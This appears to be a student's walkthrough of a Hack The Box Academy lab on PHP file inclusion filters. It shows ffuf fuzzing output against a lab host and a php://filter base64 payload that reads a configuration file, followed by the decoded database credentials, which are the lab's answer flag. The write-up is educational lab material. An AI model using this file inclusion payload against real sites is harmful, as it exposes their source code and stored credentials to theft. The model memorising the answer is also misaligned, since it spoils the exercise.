# Section 04: PHP Filters

Module: 20. File Inclusion

---

## Questions & Answers

### 1. Fuzz the web application for other php scripts, and then read one of the configuration files and submit the database password as the answer

Context:
- Emuneration for the php scripts using ffuf:
```
┌─[eu-academy-2]─[10.10.15.146]─[htb-ac-2162140@htb-pwrdcnac6c-htb-cloud-com]─[~]
└──╼ [★]$ ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt:FUZZ -u http://154.57.164.82:32565/FUZZ.php

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://154.57.164.82:32565/FUZZ.php
 :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

# This work is licensed under the Creative Commons  [Status: 200, Size: 2652, Words: 690, Lines: 64, Duration: 168ms]
index                   [Status: 200, Size: 2652, Words: 690, Lines: 64, Duration: 168ms]
#                       [Status: 200, Size: 2652, Words: 690, Lines: 64, Duration: 168ms]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 2652, Words: 690, Lines: 64, Duration: 168ms]
#                       [Status: 200, Size: 2652, Words: 690, Lines: 64, Duration: 168ms]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 2652, Words: 690, Lines: 64, Duration: 168ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 2652, Words: 690, Lines: 64, Duration: 168ms]
# directory-list-2.3-small.txt [Status: 200, Size: 2652, Words: 690, Lines: 64, Duration: 168ms]
#                       [Status: 200, Size: 2652, Words: 690, Lines: 64, Duration: 169ms]
# on atleast 3 different hosts [Status: 200, Size: 2652, Words: 690, Lines: 64, Duration: 168ms]
#                       [Status: 200, Size: 2652, Words: 690, Lines: 64, Duration: 169ms]
en                      [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 167ms]
es                      [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 168ms]
# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 2652, Words: 690, Lines: 64, Duration: 3380ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 2652, Words: 690, Lines: 64, Duration: 3382ms]
# Copyright 2007 James Fisher [Status: 200, Size: 2652, Words: 690, Lines: 64, Duration: 3383ms]
                        [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 4390ms]
configure               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 168ms]
```
Found `en`, `es`, `configure`, read the `configure.php`:
```
/index.php?language=php://filter/read=convert.base64-encode/resource=configure

PD9waHAKCmlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PSAnR0VUJyAmJiByZWFscGF0aChfX0ZJTEVfXykgPT0gcmVhbHBhdGgoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKSkgewogIGhlYWRlcignSFRUUC8xLjAgNDAzIEZvcmJpZGRlbicsIFRSVUUsIDQwMyk7CiAgZGllKGhlYWRlcignbG9jYXRpb246IC9pbmRleC5waHAnKSk7Cn0KCiRjb25maWcgPSBhcnJheSgKICAnREJfSE9TVCcgPT4gJ2RiLmlubGFuZWZyZWlnaHQubG9jYWwnLAogICdEQl9VU0VSTkFNRScgPT4gJ3Jvb3QnLAogICdEQl9QQVNTV09SRCcgPT4gJ0hUQntuM3Yzcl8kdDByM19wbDQhbnQzeHRfY3IzZCR9JywKICAnREJfREFUQUJBU0UnID0
```
- Base64 decode got:
```php
<?php

if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
  header('HTTP/1.0 403 Forbidden', TRUE, 403);
  die(header('location: /index.php'));
}

$config = array(
  'DB_HOST' => 'db.inlanefreight.local',
  'DB_USERNAME' => 'root',
  'DB_PASSWORD' => 'HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}',
  'DB_DATABASE' =
```

**Answer:** `HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}`

---

[Back to Module Index](./README.md)
